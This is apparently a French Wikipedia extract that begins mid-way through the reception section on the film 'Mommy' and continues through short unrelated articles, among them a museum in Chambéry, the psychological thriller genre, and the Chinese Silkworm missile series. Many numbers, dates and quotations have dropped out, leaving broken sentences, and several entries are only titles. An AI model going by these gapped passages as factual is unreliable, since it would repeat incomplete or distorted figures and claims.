Au Québec, pour son premier week-end, le film connait un départ canon avec $ sur 64 écrans à travers la province. C'est le meilleur démarrage de film depuis la sortie de "Le sens de l'humour" en 2011. Après 11 jours, il dépasse déjà le million de dollars, devenant le premier film de Xavier Dolan à franchir cette barre symbolique. Ce bouche-à-oreille positif incite le diffuseur à ajouter 18 copies lors de la troisième semaine d'exploitation. Le , pour sa cinquième semaine, "Mommy" devient le film québécois le plus lucratif de 2014 avec , dépassant ainsi le film "1987". Lors de sa neuvième semaine, le film passe le cap des 3 millions $ et se hisse même dans le top 15 des meilleures recettes de l’année 2014.
En France, dès la séance de 14h, "" enregistre 2 685 entrées dans 24 salles parisiennes, pour une moyenne de 112 spectateurs par copie, c'est le meilleur démarrage en une semaine depuis "Les Gardiens de la Galaxie" (2 819 entrées). Il arrive à 273 026 entrées pour son premier week-end, troisième place du top week-end. Le film récolte 11 % de parts de marché français et une moyenne de 867 entrées par copie. Lors de sa première semaine, le film a été vu par 340 171 spectateurs, soit le meilleur démarrage de tous les temps pour un film québécois en France. Après six semaines, avec spectateurs, il devient un des rares films québécois à atteindre le million d’entrées.
Aux États-Unis, le film sort à New York et à Los Angeles sur quatre écrans. Par la suite, le distributeur américain prévoit d'augmenter le nombre de salles et de villes au cours des prochains semaines. Il s'agit d'une méthode souvent utilisée aux États-Unis pour les films étrangers. Pour le premier week-end, le départ est médiocre avec $, "Indiewire" s'explique mal de cette contre-performance.
Accueil critique.
Festival de Cannes.
"Le Monde" le qualifie de et "Télérama" explique à propos de Xavier Dolan, que Le ' écrit qu' et ' ajoute que Le site Critikat écrit que si Un journaliste de "L'Express" ajoute que le film est Les trois acteurs principaux sont « époustouflants » et « formidables », alors que la musique du film est plébiscitée par les critiques. Peu après sa projection, "" est considéré comme l'un des favoris à la Palme d'or.
Concernant le ratio d'image 1:1, des critiques estiment que ce format rare favorise l'impression de claustrophobie tout à fait adaptée au récit, et le site "Écran Noir" ajoute que ' écrit à propos de la réalisation que l'une des forces de Dolan Alors que Dolan est régulièrement qualifié d'« enfant terrible » ou de « jeune prodige » par la presse, ' est décrit comme un film énergique, déchirant, nerveux, drôle et désespéré, un « tour de force » d'après certains critiques. Le film aborde la place de la jeunesse dans la société et d'une classe sociale déboussolée et ostracisée qui s'approprie le rêve américain.
Québec.
Tout comme à Cannes, les critiques au Québec sont très élogieuses au film, particulièrement "Cinoche.com", qui lui a accordé 4,5 étoiles sur cinq, déclare que ce film est Même le sérieux site "Mediafilm.ca" a accordé au film une très bonne note, saluant notamment les performances des acteurs. Le critique de "Point de vues" n'a pas hésité à accorder 5 étoiles à ", expliquant qu'il avait été « soufflé » en sortant du cinéma.
Malgré des critiques excellentes, " connaît quelques bémols, dont "La Presse", avec 4 étoiles sur 5, qui admet que ou "Le Soleil" qui avoue que 
France.
La critique a unanimement salué "Mommy". Selon le site Allociné, le film a obtenu 4,3/5 étoiles pour 32 critiques, le plaçant au premier top du meilleur film de la semaine selon la presse, juste devant le film "Le Garçon et le Monde". Au moins 17 critiques ont mis 5 sur 5 étoiles à ce film, dont la revue "Cahiers du cinéma", qui écrit : , le journal hebdomadaire "Le Journal du dimanche" décrit le film , le quotidien "Libération" considère ce film comme ou "Télé 2 Semaines" loue le réalisateur Xavier Dolan : .
Parmi les critiques les plus sévères, "Écran Large", avec une étoile et demie sur cinq, reproche le film d'être , alors que "Les Fiches du cinéma" admet que Rue89, dans sa critique intitulée « ' et ' : je ne ferai pas l’éloge de Fincher et Dolan », écrit que Cependant, tous s'entendent sur une chose : les comédiens sont excellents.
États-Unis.
À Hollywood, le film a été projeté en vue des Oscars et des . Le magazine ' le place en deuxième position des meilleurs films de 2014, derrière ' et devant ' et '. , pour sa part, l'a inclus sur la liste des 20 meilleurs films de l'année. De plus, la performance d'Anne Dorval a été remarquée notamment par "Variety" qui la voit comme une des meilleures de l'année, le magazine américain estimant même que l'actrice s'est fait "voler" le prix d'interprétation féminine par Julianne Moore au dernier Festival de Cannes. Anne Dorval a aussi attiré l'attention de "Hollywood Reporter" qui ne serait pas surpris de voir l'actrice parmi les cinq finalistes de l'Oscar de la meilleure actrice. Pour que l'actrice puisse concourir dans cette catégorie, il faut que "Mommy" sorte dans les salles de cinéma américaines avant le . Comme le distributeur américain, Roadside Attractions, a mis le film à l'affiche dans une salle de Los Angeles pendant une semaine au début du mois de décembre, "Mommy" est ainsi éligible dans toutes les catégories aux Oscars 2015.
Accueil public.
Du côté des spectateurs, selon le site AlloCiné, "" a obtenu la note 4,5 étoiles sur 5 et figure en cinquième place des meilleurs notes spectateurs de tous les films. Le cinéaste Claude Lelouch a écrit sur son Twitter : . En France, le film a reçu l’étiquette Coup de foudre du public, décernée par l’Observatoire de la satisfaction pour avoir atteint le taux de satisfaction à 93 %.
En 2015, sur le site Allociné, il est classé par les spectateurs à la onzième place des meilleurs films de tous les temps.
L'agrégateur affiche 90 % de critiques positives, avec une moyenne de 8,3/10 sur 30 critiques, alors que indique la note de 81 / 100 sur 9 critiques.

</doc>
<doc id="7903648" url="https://fr.wikipedia.org/wiki?curid=7903648" title="Cuivre rouge">
Cuivre rouge



</doc>
<doc id="7903649" url="https://fr.wikipedia.org/wiki?curid=7903649" title="Antoine-Olivier Pilon">
Antoine-Olivier Pilon



</doc>
<doc id="7903659" url="https://fr.wikipedia.org/wiki?curid=7903659" title="Still the Water">
Still the Water

 est un drame romantique japonais réalisé par Naomi Kawase, sorti en 2014.
Le film est présenté en sélection officielle au Festival de Cannes 2014.
Synopsis.
Sur l'île d'Amami, au Japon, les habitants vivent en harmonie avec la nature. Un drame arrive lorsqu'un cadavre est retrouvé dans la mer. Kaito est profondément marqué, tandis que son amie, Kyoko, fait face aux derniers jours de sa mère, gravement malade.
Ils accepteront l'idée de la vie et de la mort, tout en découvrant ensemble l'amour et leur sexualité naissante.
Autour du film.
Le film a été tourné dans la nature pittoresque de la ville d'Amami, Amami-Ōshima, dans la préfecture de Kagoshima, au Japon en 2013. Amami-Ōshima est une île aux chants et danses traditionnels uniques, d'où est originaire l'ancêtre de la réalisatrice. La musique a été réalisée par Hasiken, un auteur-compositeur-interprète masculin de Chichibu, préfecture de Saitama.
Le film a été pressenti dans un premier temps pour la Palme d'Or, si bien que Kawase a été rappelée à Cannes pour la remise des prix. Cependant, l'œuvre n'en a obtenu aucun.
Naomi Kawase disait avoir été souvent livrée à elle-même, ses parents ne s'occupant que peu de leur enfant. Cette idée est très présente à travers le personnage de Kaito. De même, la réalisatrice a fait face à la mort de sa mère adoptive durant le tournage du film.

</doc>
<doc id="7903660" url="https://fr.wikipedia.org/wiki?curid=7903660" title="Futatsume no mado">
Futatsume no mado



</doc>
<doc id="7903661" url="https://fr.wikipedia.org/wiki?curid=7903661" title="Place du 3e-Régiment-de-Tirailleurs-Algériens">
Place du 3e-Régiment-de-Tirailleurs-Algériens

La place du -Régiment-de-Tirailleurs-Algériens est une place de la ville de Strasbourg, en France.
Localisation.
La place se trouve au cœur du parc de la Citadelle, dans le quartier de l'Esplanade, qui est englobé dans le quartier Bourse - Esplanade - Krutenau
Origine du nom.
La place fut ainsi nommée en l'honneur du de tirailleurs algériens (RTA) qui fut créé en 1856, décoré de la Légion d'Honneur le et dissous en 1962.
La d'infanterie algérienne, à laquelle était rattaché le RTA, se distingua lors de nombreuses batailles en Alsace, notamment lors de la prise de Mulhouse et la défense de Strasbourg à Kilstett, en .
Transports en commun.
La ligne de bus 30 dessert le Parc de la Citadelle.

</doc>
<doc id="7903667" url="https://fr.wikipedia.org/wiki?curid=7903667" title="Système de Sperner">
Système de Sperner



</doc>
<doc id="7903669" url="https://fr.wikipedia.org/wiki?curid=7903669" title="Giampiero Rigosi">
Giampiero Rigosi

Giampiero Rigosi (né le à Bologne dans la région de l'Émilie-Romagne) est un écrivain et un scénariste italien, auteur de roman policier, principalement connu en France pour son roman policier humoristique "Bus de nuit".
Biographie.
Il fait des études supérieures et décroche un diplôme en philosophie.
Il exerce ensuite de nombreux métiers (conducteur de bus, chauffeur routier, ambulancier, pompiste ...) avant de s’orienter vers l’écriture. Il publie en 1995 un premier roman policier intitulé "Dove finisce il sentiero", traduit sous le titre "Où finit le sentier ?" en 2000. Il écrit deux nouveaux romans, puis signe un guide touristique sur la région de Bologne et un ouvrage à l’attention de la jeunesse, "Transilvania", pour le compte des éditions Walt Disney.
"Notturno bus", son quatrième roman et sa seconde traduction en langue française, écrit en collaboration avec Guido Leotta, est un excellent récit humoristique, habile mélange d’humour noir et de comédie à l’italienne, où un vieux chauffeur de bus endetté par le poker rencontre une jeune voleuse ayant la pègre italienne à ses trousses. Publié à la Série noire en 2004, sous le titre "Bus de nuit", il est adapté au cinéma par Davide Marengo en 2007 sous le même titre, avec Giovanna Mezzogiorno et Valerio Mastandrea dans les rôles principaux.
Comme scénariste, il collabore à l’écriture de plusieurs épisodes pour des séries policières italiennes et participe à l'écriture commune de cinq scénarios pour le cinéma. En 2006, il participe à l'émission "Milonga Station", aux côtés notamment des auteurs Simona Vinci et Carlo Lucarelli. 

</doc>
<doc id="7903672" url="https://fr.wikipedia.org/wiki?curid=7903672" title="Thriller psychologique">
Thriller psychologique

Le thriller psychologique est un genre combinant les genres thriller et psychologique. Il est couramment utilisé pour décrire la littérature ou les films qui traitent des récits psychologiques sous forme de thriller.
En termes de contexte et de convention, il s'agit d'un sous-genre de la structure narrative plus large du thriller avec des similitudes avec le gothique et la fiction policière dans le sens d'avoir parfois un « sens de la réalité qui se dissout ». Il est souvent raconté à travers le point de vue de personnages psychologiquement stressés, révélant leurs perceptions mentales déformées et se concentrant sur les relations complexes et souvent torturées entre les personnages obsessionnels et pathologiques. Les thrillers psychologiques incorporent souvent des éléments de mystère, de drame, d'action et de paranoïa . Le genre est étroitement lié et chevauche parfois le genre d'horreur psychologique, ce dernier impliquant généralement plus d'éléments et de thèmes d' et des scénarios plus dérangeants ou effrayants.
Définition.
Selon Peter Hutchings, de nombreux films ont été qualifiés de thrillers psychologiques, mais ce terme désigne généralement "des récits au cadre domestiqué dans lesquels l'action est supprimée et où les sensations fortes sont plutôt fournies par des enquêtes sur la psychologie des personnages principaux". La caractéristique distinctive d'un thriller psychologique est qu'il met l'accent sur les états mentaux de ses personnages : leurs perceptions, leurs pensées, leurs distorsions et leur lutte générale pour appréhender la réalité.
Selon le réalisateur John Madden, les thrillers psychologiques se concentrent sur l'histoire, le développement du personnage, le choix et le conflit moral ; la peur et l'anxiété alimentent la tension psychologique de manière imprévisible. Madden a déclaré que leur manque de spectacle et l'accent mis sur les personnages ont conduit à leur baisse de popularité à Hollywood. Les thrillers psychologiques créent du suspense en exploitant l'incertitude quant aux motivations des personnages, à leur honnêteté et à leur façon de voir le monde. Les films peuvent également provoquer un malaise chez les spectateurs en privilégiant les informations qu'ils souhaitent partager avec les personnages ; les personnages coupables peuvent souffrir d'une détresse similaire en raison de leurs connaissances.
Cependant, James N. Frey définit le thriller psychologique comme un style, plutôt qu'un sous-genre ; Frey affirme que les bons thrillers se concentrent sur la psychologie de leurs antagonistes et construisent lentement le suspense par l'ambiguïté. Les créateurs et/ou les distributeurs ou éditeurs de films qui cherchent à se distancer des connotations négatives de l'horreur classent souvent leur œuvre dans la catégorie des thrillers psychologiques. La même situation peut se produire lorsque des critiques qualifient une œuvre de thriller psychologique afin d'en augmenter la valeur littéraire.
Thèmes.
De nombreux thrillers psychologiques ont vu le jour ces dernières années, tous déclinés sur différents supports (cinéma, littérature, radio, etc.). Malgré ces formes de représentation très différentes, des tendances générales sont apparues à travers les récits. Parmi ces thèmes constants, citons :
Dans les thrillers psychologiques, les personnages doivent souvent mener un combat intérieur. L'amnésie est un élément de l'intrigue fréquemment utilisé pour explorer ces questions. Les personnages peuvent être menacés de mort, être obligés de faire face à la mort d'autres personnes ou simuler leur propre mort. Les thrillers psychologiques peuvent être complexes, et les critiques peuvent recommander un deuxième ou troisième visionnage pour "déchiffrer ses secrets". Les éléments communs peuvent inclure des personnages de base, comme un détective dur à cuire et un tueur en série, impliqués dans un jeu du chat et de la souris. Les romans à sensation, exemples des premiers thrillers psychologiques, étaient considérés comme socialement irresponsables en raison de leurs thèmes de sexe et de violence. Ces romans, entre autres, ont été inspirés par les exploits du détective Jack Whicher. L'eau, en particulier les inondations, est fréquemment utilisée pour représenter l'inconscient, comme dans "What Lies Beneath" et "In Dreams". Les thrillers psychologiques ne se soucient pas toujours de la vraisemblance. Peter Hutchings définit le giallo, un sous-genre italien du thriller psychologique, comme un mystère de meurtre violent qui privilégie le style et le spectacle à la rationalité. D'après Peter B. Flint du "New York Times", les détracteurs d'Alfred Hitchcock l'ont accusé de "s'appuyer sur des astuces astucieuses, des scénarios illogiques et de folles coïncidences".

</doc>
<doc id="7903682" url="https://fr.wikipedia.org/wiki?curid=7903682" title="Sergueï Gorbatchev">
Sergueï Gorbatchev

Sergueï Gorbatchev (en ) est un joueur russe de volley-ball né le à Léningrad (oblast de Léningrad, alors en URSS). Il mesure et joue passeur.
Palmarès.
Néant.

</doc>
<doc id="7903687" url="https://fr.wikipedia.org/wiki?curid=7903687" title="Sœurs de Sainte-Marthe d'Angoulême">
Sœurs de Sainte-Marthe d'Angoulême



</doc>
<doc id="7903688" url="https://fr.wikipedia.org/wiki?curid=7903688" title="Makiko Watanabe">
Makiko Watanabe

, née le à Tokyo, est une actrice japonaise.

</doc>
<doc id="7903690" url="https://fr.wikipedia.org/wiki?curid=7903690" title="Muséum d'histoire naturelle de Chambéry">
Muséum d'histoire naturelle de Chambéry

Le muséum d'histoire naturelle de Chambéry est un musée d'histoire naturelle situé en France sur la commune de Chambéry, dans le département de la Savoie, en région Auvergne-Rhône-Alpes.
Il est géré par la Société d'histoire naturelle de la Savoie (SHNS), depuis son inauguration en 1846.
Situation.
Le muséum d'histoire naturelle de Chambéry est situé au sud de la commune, en contrebas du château dit « des Ducs de Savoie », au pied du quartier de "Bellevue" installé sur les premières pentes du massif de la Chartreuse. Il est ainsi installé dans l'ancienne maison des jardiniers du château.
Cet emplacement correspondait à la partie basse des jardins royaux du château de Chambéry qui aux débuts du musée avaient laissé place à un jardin botanique et zoologique. Toutefois, la volonté de Napoléon III de tracer une nouvelle allée, dite « allée Cavalière », au sud du château, va remplacer une partie de ce jardin dans sa partie est.
La partie ouest, préservée, est aujourd'hui intégrée dans un jardin dit « jardin du muséum » ou « jardin des senteurs » du fait de la possibilité laissée aux promeneurs de toucher et sentir librement une quarantaine de variétés de plantes.
Le muséum a également été longé pendant plusieurs années par l'ancienne Route nationale 6 reliant Lyon à l'Italie par le col du Mont-Cenis et à ce titre longtemps surnommée « Route de Lyon ». À la fois déclassée et détournée, la route porte aujourd'hui le nom d"'Avenue de Lyon".
Histoire.
Le muséum d'histoire naturelle est créé en 1846, soit deux ans après la création de la Société d'histoire naturelle de Savoie (SNHS), l'une des nombreuses sociétés savantes de Savoie. Tous deux sont à l’initiative du roi Charles-Albert de Piémont-Sardaigne, la Savoie ne devenant département français qu'à partir de 1860.
Naissance de la Société d'histoire naturelle de Savoie (SNHS).
Une ordonnance royale du roi Charles-Albert autorise la formation de la Société d'histoire naturelle en Savoie par lettres patentes du , et entérinées le . L'initiative de la création ce cette société d'histoire naturelle revient au marquis Pantaléon Costa de Beauregard, passionné d'ornithologie ; Félix Genin (ca.1813-1898), naturaliste (entomologiste), et le chanoine François Chamousset (1808-1882), professeur au séminaire de Chambéry, spécialisé en géologie et botanique, qui décide de mettre en commun leur collection.
Le suivant, alors que la société compte 57 adhérents, la première assemblée générale se tient à l’hôtel de ville de Chambéry et élit à l'unanimité le marquis Pantaléon Costa de Beauregard président et le cardinal Alexis Billiet président honoraire. Durant l'année qui s'écoule, ce nombre double, puis triple en 1850. Contrairement à l'Académie de Savoie, la SNHS est ouverte au plus grand nombre, notamment à la petite bourgeoisie.
La création de SNHS permet la mise en place rapide d'un musée, d'un jardin botanique ainsi que la publication d'une revue, le "Bulletin de la Société d'histoire naturelle de Savoie" (mensuel).
L'enthousiasme des premiers temps est mis à mal par la multitude de projet. En 1855, une partie des membres quitte la SNHS, notamment François Rabut (1819-1893), professeur d'histoire à Chambéry, archéologue ainsi que Conservateur du musée d'histoire naturelle. Il fondera plus tard avec d'autres la Société savoisienne d'histoire et d'archéologie.
Elle est reconnue comme « établissement d'utilité publique » par décret.
Naissance du Muséum d'histoire naturelle.
Un emplacement pour le futur musée devant par la suite être trouvé, le souverain Charles-Albert décide d'offrir la maison des jardiniers du château des Ducs de Savoie attenant, ainsi que la partie basse du jardin Royal pour la constitution du futur jardin botanique. Leur concession définitive est approuvée le à l’occasion de la troisième assemblée générale de la Société, qui en reçoit la gestion la mise en possession à usage gratuit. Le nouveau muséum aménagé accueille finalement sa première assemblée générale le .
Sitôt la société créée, de nombreux dons sont recensés, parmi lesquels un gypaète barbu de la vallée de la Maurienne ainsi que insectes et coléoptères dès 1844, des minéraux et fossiles et un herbier de Savoie en 1845 ou encore échantillons du Jurassique en 1846. Fin , la collection du muséum s'enrichit d'un lynx, offert quelques années plus tôt pour le jardin zoologique et retrouvé mort la veille. Ce jardin zoologique comportait également un aigle, des marmottes et un chamois.
L'année 1849 marque aussi la création de 22 sections du muséum : archives, bibliothèque, bâtiment, archéologie et numismatique, chimie, minéralogie, géologie, botanique (herbier et jardin), zoologie, insectes, arachnides, crustacés, annélides, mollusques, poissons, reptiles, oiseaux, œufs et nids, mammifères, animaux vivants, et anatomie comparée. En 1850, le muséum ouvre ses portes au public et la Société publie son premier bulletin.
Le , le muséum obtient le label national « Musée de France » qui .
Le musée.
Collections.
Le muséum de Chambéry abrite quelque d'animaux, mammifères, oiseaux, mollusques ou encore insectes, comme les lépidoptères, le département de la Savoie en comptant des espèces. S'ajoutent également des minéraux et des fossiles.
Gestion et visites.
Le muséum demeure aujourd'hui géré par la Société d'histoire naturelle de la Savoie et sa dizaine de bénévoles, ses tutelles que sont la commune et le département étant considérées insuffisamment contributives à sa gestion. À ce titre, il n'est ouvert au public que les mercredis après-midi et sur réservations pour les groupes le reste de la semaine.
La SHNS publie par ailleurs des bulletins périodiques trimestriels d’une soixantaine de pages d’articles scientifiques.
Fréquentation.
En 2015, le Musée estime accueillir entre et par an.

</doc>
<doc id="7903693" url="https://fr.wikipedia.org/wiki?curid=7903693" title="Takemarit">
Takemarit

Le takemarit, ou el kemmariya, est un fromage de chèvre traditionnel algérien originaire de Ghardaia et Naâma.
Description.
C'est un fromage blanc mélangé avec du "leben". Il est fabriqué par les femmes selon les procédés traditionnels. Il ne contient pas de sel et possède une texture molle.
Dégustation.
Le "takemarit" est un fromage festif servi lors des fêtes et cérémonies familiales. Ce fromage est également un signe de bienvenue pour les invités ; il est servi accompagné de thé à la menthe et de cacahuètes, jamais avec du pain.

</doc>
<doc id="7903697" url="https://fr.wikipedia.org/wiki?curid=7903697" title="Dmitri Doubovskoï">
Dmitri Doubovskoï

Dmitri Aleksandrovitch Doubovskoï (en ) est un joueur russe de volley-ball né le . Il mesure et joue réceptionneur-attaquant.

</doc>
<doc id="7903699" url="https://fr.wikipedia.org/wiki?curid=7903699" title="Captain Horatio Hornblower R.N.">
Captain Horatio Hornblower R.N.



</doc>
<doc id="7903704" url="https://fr.wikipedia.org/wiki?curid=7903704" title="Nuage de condensation">
Nuage de condensation

Un nuage de condensation est un type de nuage qui se forme par la condensation de l'humidité atmosphérique sous l'effet de l'onde de choc engendrée par une puissante explosion.
Il est également appelé nuage de Wilson, en hommage à Charles Thomson Rees Wilson, physicien britannique prix Nobel de physique en 1927 pour sa chambre à brouillard.
Explosions atomiques.
Les plus grands nuages de condensation sont formés par les explosions atomiques en atmosphère tropicale saturée en humidité. La condensation se produit en arrière de l'onde de choc, dans la zone de dépression atmosphérique qui la suit, et qui est caractérisée par une diminution adiabatique de la température de cette tranche d'air, en deçà de la température de rosée.
La forme de l'onde de choc de l'explosion et les différences de température et d'hygrométrie des différentes couches d'air déterminent la forme du nuage de condensation. En cas de milieu homogène, celui-ci aura la forme d'une bulle sphérique, mais il peut aussi prendre la forme d'anneaux concentriques, si différentes couches d'air de nature différente sont affectées par l'onde de choc.
La durée de vie d'un nuage de condensation est généralement brève, notamment si les radiations induites par l'explosion augmentent suffisamment les températures pour faire disparaître les conditions de sa formation.
Historique.
C'est lors de l'opération Crossroads en 1946 que les scientifiques américains, observant ce type de nuages lors des deux explosions atomiques sur l'atoll de Bikini, lui ont donné le nom de nuage de Wilson.

</doc>
<doc id="7903705" url="https://fr.wikipedia.org/wiki?curid=7903705" title="Nuage de Wilson">
Nuage de Wilson



</doc>
<doc id="7903718" url="https://fr.wikipedia.org/wiki?curid=7903718" title="Un vin presque parfait">
Un vin presque parfait

Un vin presque parfait est un événement dont le but est de sélectionner des vins par un jury. La sélection organisée par M6 (chaîne de télévision du Groupe Metropole Television) et par Armonia (organisateur du Concours international des vins à Lyon). À l’issue de la sélection un guide est distribué dans les librairies.
La notation.
Les vins sont notés selon trois critères :
Le Jury.
La sélection est présidée par Fabrice Sommier Meilleur ouvrier de France 2007 et Chef Sommelier du restaurant Georges Blanc.
Chaque table de jury est composée de professionnels du vin (œnologues, sommeliers, cavistes, courtiers, producteurs, chefs cuisiniers….) et d’amateurs éclairés. Les professionnels du vin vérifient la conformité. La dégustation se fait à l’aveugle.
Récompense.
Les producteurs sont autorisés à apposer un macaron autocollant sur les bouteilles récompensées.
Le guide Un vin presque parfait.
À l'issue de la sélection un livre « Un vin presque parfait » est publié dans les librairies. Il propose les vins classés en 10 régions.
Les vins sont commentés par Fabrice Sommier, Meilleur ouvrier de France Sommellerie.
60 pages dans le livre sont consacrées à des conseils pour acheter, conserver et servir le vin.
Chaque vin est décrit selon les éléments suivants :

</doc>
<doc id="7903719" url="https://fr.wikipedia.org/wiki?curid=7903719" title="Sergueï Khorochev">
Sergueï Khorochev

Sergueï Sergueïevitch Khorochev (en ) est un joueur russe de volley-ball né le . Il mesure et joue central. Il est international russe.

</doc>
<doc id="7903737" url="https://fr.wikipedia.org/wiki?curid=7903737" title="Silkworm (missile)">
Silkworm (missile)

Les séries Shang Yo ou SY (du , « contre-courant ») et Hai Ying ou HY (du , « aigle de mer ») sont d'anciens missiles antinavires, conçus par l'industrie de l'armement de la république populaire de Chine. Ils étaient dérivés du missile soviétique P-15 Termit.
Les HY-1 et HY-2 reçurent la désignation OTAN de « Silkworm ». Pour ne pas arranger les choses, les médias occidentaux désignaient également les séries SY et ses dérivés d'exportation, les séries Fei Long ou FL (du , « dragon volant »), par le nom de "Silkworm's".
Histoire.
Le "Silkworm" fut conçu et développé à l'Institut de la Mécanique, sous la direction de Qian Xuesen, un scientifique qui effectua ses études à l'Institut des Technologies du Massachusetts (MIT) et à l'Institut des Technologies de Californie (Caltech), avant d'être déporté par les États-Unis en 1955 en raison d'une suspicion de liens communistes. Un ouvrage racontant la vie de ce scientifique fut écrit par Iris Chang, intitulé .
Série.
Les missiles de la série SY furent développés à-partir du P-15 Termit conçu par le complexe militaro-industriel soviétique.
Ils étaient employés sur des navires lance-missiles de faibles dimensions, dotés d'équipements électroniques faibles et limités. Les chinois rencontrèrent des difficultés à rendre le missile compatible avec les systèmes plus complexes équipant habituellement les navires de dimensions plus importantes. Cela pourrait avoir causé des lancements prématurés ou des détonations lorsque les équipements électroniques fonctionnaient à pleine-puissance.
En conséquence, afin d'équiper les navires et de remplacer les missiles de la série SY, les chinois développèrent les missiles de la série HY. Les missiles SY avaient été conçus au-départ pour équiper les navires en parallèle à ceux de la série HY, et ils permettaient également de proposer une alternative économique au marché d'exportation.
SY-1.
Le SY-1, désigné par l'OTAN CSS-N-1 , est la version chinoise originale du P-15 soviétique, produite à l'usine 320 (Nanchang Aircraft Factory : 南昌飞机制造厂). Les sources chinoises identifient les deux concepteurs de cette arme comme étant Li Tongli et Lu Lin.
La différence principale entre le P-15 "termit" et le SY-1 venait principalement du remplacement de l'altimètre peu fiable du modèle soviétique par un modèle bien plus efficace dans le missile chinois. Le successeur du SY-1, conçu par Peng Lisheng (彭历生) et désigné SY-1A, était doté d'un radar de guidage monopulse, qui remplaçait l'ancien modèle à balayage conique.
Le missile fut ensuite modernisé pour être aéroporté, et cette version reçut la désignation de C-601. Elle fut la première arme anti-navire aéroportée de la Chine et l'OTAN lui attribua la désignation de CAS-1 . Il fut utilisé par les avions irakiens H-6 au-cours de la guerre qui les opposa à l'Iran. Une version dotée de nouveaux circuits intégrés, d'un nouvel autodirecteur à radar actif et d'un nouvel altimètre radio entra en service sous le nom de SY-1A, au début des années 1980.
SY-2.
Le moteur à carburant liquide étant plutôt dangereux et peu fiable, un modèle à carburant solide fut développé.
Ce propulseur permit également de réduire la taille et de diminuer la masse du missile, tout en lui apportant une portée plus importante. La masse de la charge militaire fut elle aussi diminuée, mais son efficacité fut en-réalité améliorée quand fut adopté un concept de charge hautement explosive semi-perforante à déclenchement retardé. La version améliorée de ce missile sera appelée SY-2A.
Série.
HY-1.
Le missile HY-1 reçut deux désignations OTAN distinctes : le CSS-N-2 , pour la version maritime, et le CSS-C-2 , pour la version de défense côtière basée à-terre.
Le HY-1J était prévu d'équiper les destroyers "Type 051", mais l'agitation conséquente à la révolution culturelle prolongea son développement jusqu'aux années 1980. Finalement, les destroyers "Type 051" déployés dans l'Océan Pacifique pour accompagner les tests de missiles balistiques ne furent pas dotés de missiles anti-navires.
Une version plus moderne dotée de deux statoréacteurs, le C-101, a également été créée à-partir du HY-1. Désigné par l'OTAN CSS-C-5 , il est lancé depuis les avions ou les navires et sa désignation chinoise est YJ-16.
HY-2.
Le missile HY-2 était identique au HY-1, mais avec un fuselage rallongé. Il était doté d'un nez arrondi, contenant l'antenne du radar, d'ailes en delta à mi-hauteur montées à mi-longueur du fuselage, et de trois gouvernes de contrôle à la queue. Il était propulsé par un moteur-fusée à ergols liquides et l'accélération au lancement était effectuée par un "booster" à poudre attaché sous le fuselage du missile.
Le HY-2, désigné C-201 en interne et CSS-C-3 par l'OTAN, était lancé depuis un poste de tir à-terre et évolue à une altitude de durant la première phase de son vol. Après avoir atteint les conditions idéales pour son vol de croisière, l'altitude de vol était réduite à une valeur comprise entre . Lors de l'approche finale vers sa cible, le missile allumait son radar et plongeait à une altitude de jusqu'à l'impact. La probabilité de coup-au-but était estimée à . La désignation C-201 désignait à-la-fois la version aéroportée du missile et sa désignation à l'exportation, tandis-que la désignation CSS-N-2 était destinée à la version tirée depuis les navires. En raison de sa taille trop importante, il ne fut jamais employé sur les navires, bien que les destroyers "Type-051" aient été prévus pour les utiliser.
Ce missile est obsolète et son remplacement futur devrait être confié aux missiles de la série YJ-8. Il a été largement exporté de par le monde, et il est le missile de la série auquel la désignation de "Silkworm" est la plus attribuée.
HY-3.
Le HaiYing-3 ou HY-3 (aussi désigné C-301 pour l'exportation), désignation OTAN CSS-C-6 , est un missile terre-mer supersonique propulsé par statoréacteur, développé par la "China Haiying Electro-Mechanical Technology Academy" (中国海鹰机电技术研究院 - CHETA, aussi connue comme la " Academy"). Il fut développé dans les années '80 et se basait sur la conception du HY-2 (C-201).
Le HY-3 est un missile de grande taille, avec un fuselage avant fin et un nez pointu, associés à une partie de fuselage arrière large comprenant quatre accélérateurs à poudre et deux statoréacteurs. Il y'a une paire de plans- à l'avant, 4 surfaces de contrôle à l'arrière, et 4 ailettes plus petites de stabilisation, attachées aux 4 "boosters" à poudre. Ces accélérateurs accélèrent le missile jusqu'à une vitesse de Mach 1.8, vitesse à-partir de laquelle le statoréacteur commence à brûler son kérosène et fait voler le missile jusqu'à une vitesse de Mach 2.5.
Sa portée est estimée, selon plusieurs sources, à une distance d'environ et il peut voler à une altitude de lors de la phase terminale de son attaque. Juste-avant d'allumer son radar, il descend encore à moins de puis plonge sur sa cible juste-avant l'impact.
Ce missile de est tiré depuis un lanceur terrestre. Chacune de ces unités de lancement consiste en 4 lanceurs, un radar d'acquisition des cibles, une unité le contrôle de tir, un groupe générateur de puissance et de 8 à 12 missiles de rechange montés sur des véhicules d'approvisionnement (un missile par camion).
HY-4.
Le développement du C-201 en HY-4 est un missile anti-navire à moyenne portée tiré depuis des avions, navires ou des postes à terre. Le développement de ce missile est supposé avoir commencé au milieu des années 1970, en remplaçant le moteur-fusée à ergols liquide du HY-2 par un petit turboréacteur, ainsi qu'en ajoutant un autodirecteur à radar monopulse.
Excepté ces quelques modifications, la configuration générale du HY-4 est assez similaire à celle du C-201, comprenant deux ailes en delta placées à mi-hauteur au centre du fuselage et trois gouvernes à la queue. Le missile est également doté d'un radioaltimètre, permettant de faire varier son altitude de croisière de , suivie par une plongée lente vers sa cible. La version aérienne est désignée C-401.
Série.
Les missiles de la série FL furent conçus comme une contrepartie de ceux de la série SY, et eurent un volume de production bien plus important que ces derniers.
Les missiles FL étaient moins chers car, étant tirés depuis des lanceurs terrestres, ils n'avaient pas à assumer toutes les contraintes d'une utilisation depuis un support maritime. Un autre intérêt majeur venait du fait qu'ils pouvaient être disposés à des endroits éloignés de leurs systèmes de désignation de cibles (C4ISTAR), ce qui améliorait grandement leur survivabilité et leur flexibilité. Les SY, HY et FL partageaient tous les mêmes systèmes.
Une version supersonique, le FL-7, fut également développée, mais ce missile était significativement différent de ceux de la série SY et ses dérivés immédiats.
FL-1.
Le FL-1, désigné par l'OTAN CSS-NX-1, était un SY-1 avec un radar monopulse à haute fréquence. Il employait un radar altimétrique pour pouvoir voler à une altitude de .
FL-2.
Les missiles anti-navire FL-2 étaient la version lancée à terre des SY-2. Ils étaient produits à l'usine de "Nanchang Aircraft Factory" (南昌飞机制造厂).
SFQ-1.
